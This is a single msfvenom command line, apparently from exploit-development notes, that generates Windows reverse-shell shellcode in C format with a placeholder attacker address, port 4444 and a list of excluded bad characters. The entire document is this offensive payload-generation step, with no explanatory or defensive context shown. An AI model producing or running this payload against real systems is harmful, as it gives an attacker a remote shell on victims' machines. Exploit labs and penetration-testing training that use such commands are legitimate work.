msfvenom -p windows/shell_reverse_tcp LHOST=$YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x01\x02\x03\x04\x05\x06\x0a" -f c
